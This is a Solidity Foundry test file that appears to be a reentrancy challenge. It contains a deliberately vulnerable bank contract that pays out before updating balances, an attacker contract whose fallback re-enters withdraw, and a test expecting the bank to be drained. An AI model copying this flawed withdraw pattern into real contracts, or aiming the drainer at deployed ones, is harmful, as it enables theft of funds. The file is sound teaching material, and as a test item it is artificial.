// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;
import "forge-std/Test.sol";
import "forge-std/console.sol";
contract DumbBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(amount <= balances[msg.sender], "not enough funds");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok);
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}

interface IDumbBank {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

contract MiddleMan {
    IDumbBank dumbBank;

    constructor(IDumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
        BankRobber b = new BankRobber{value: 1 ether}(IDumbBank(address(dumbBank)));
        b.deposit(1 ether);
        b.withdraw1eth();
    }

}


// This attack fails. Make the attack succeed.
contract BankRobber {
    IDumbBank dumbBank;

    function deposit(uint256 amount) external  {
        dumbBank.deposit{value: amount}();
    }

    function withdraw1eth() external {
        dumbBank.withdraw(1 ether);
    }

    constructor(IDumbBank _dumbBank) payable {
        dumbBank = _dumbBank;
    }

    fallback() external payable{
        if (address(dumbBank).balance >= 1 ether) {
            dumbBank.withdraw(1 ether);
        }
    }
}
contract Test42 is Test {

    function test_ShinjiIkari() external {
        vm.deal(address(this), 100 ether);
        DumbBank dumbBank = new DumbBank();
        vm.deal(address(dumbBank), 10 ether);
        console.log("dumbBank balance before hack", address(dumbBank).balance / 1e18);
        new MiddleMan{value: 1 ether}(IDumbBank(address(dumbBank)));
        console.log("dumbBank balance after hack", address(dumbBank).balance / 1e18);
        assertEq(address(dumbBank).balance, 0 ether);
        assertEq(address(0xffD4505B3452Dc22f8473616d50503bA9E1710Ac).balance, 11 ether);

    }
}
